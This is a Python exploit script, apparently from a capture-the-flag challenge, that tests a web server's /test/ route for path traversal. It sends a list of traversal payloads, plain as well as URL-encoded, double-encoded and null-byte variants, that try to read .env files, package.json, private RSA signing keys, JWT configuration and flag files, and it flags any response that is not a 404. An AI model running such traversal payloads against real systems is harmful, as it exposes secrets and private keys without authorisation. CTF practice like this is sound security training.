"""
Try path traversal on the /test/ route to read server files.
The pcap metadata shows storagePath starts with /app/data/test/...
So /test/ route maps to /app/data/test/.
We need to traverse up to /app/ to find keys, config, source code.
"""
import requests

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

# The download path pattern: /test/7f9c18a2e44d/<hash>.pcap
# Storage path: /app/data/test/7f9c18a2e44d/<hash>.pcap
# So /test/ maps to /app/data/test/
# To reach /app/ we need ../../
# To reach /app/keys/ we need ../../keys/

traversals = [
    # Try to read .env, package.json, keys etc
    "/test/7f9c18a2e44d/../../.env",
    "/test/7f9c18a2e44d/../../../.env",
    "/test/../.env",
    "/test/../../.env",
    "/test/7f9c18a2e44d/../../package.json",
    "/test/../package.json",
    "/test/../../package.json",
    "/test/7f9c18a2e44d/../../keys/legacy-rs256-retired.pem",
    "/test/7f9c18a2e44d/../../keys/legacy-rs256-retired.key",
    "/test/7f9c18a2e44d/../../keys/primary-rs256.pem",
    "/test/../keys/legacy-rs256-retired.pem",
    "/test/../../keys/legacy-rs256-retired.pem",
    "/test/7f9c18a2e44d/../../config/keys.json",
    "/test/7f9c18a2e44d/../../config/jwt.json",
    "/test/7f9c18a2e44d/../../src/keys/legacy-rs256-retired.pem",
    "/test/7f9c18a2e44d/../../data/keys/legacy-rs256-retired.pem",
    # URL-encoded traversal
    "/test/7f9c18a2e44d/..%2f..%2f.env",
    "/test/7f9c18a2e44d/%2e%2e/%2e%2e/.env",
    "/test/7f9c18a2e44d/....//....//",
    "/test/7f9c18a2e44d/..%252f..%252f.env",
    # Double encoding
    "/test/7f9c18a2e44d/%252e%252e/%252e%252e/.env",
    # Null byte (old school)
    "/test/7f9c18a2e44d/../../.env%00.pcap",
    # Try flag file directly
    "/test/7f9c18a2e44d/../../flag",
    "/test/7f9c18a2e44d/../../flag.txt",
    "/test/../flag",
    "/test/../flag.txt",
    "/test/../../flag",
    "/test/../../flag.txt",
]

for path in traversals:
    r = requests.get(f"{base}{path}")
    body = r.text[:200]
    if r.status_code != 404 or "archive artifact not found" not in body:
        print(f"INTERESTING: {path}")
        print(f"  Status: {r.status_code}")
        print(f"  Body: {body}")
        print()
    else:
        print(f"  404: {path}")
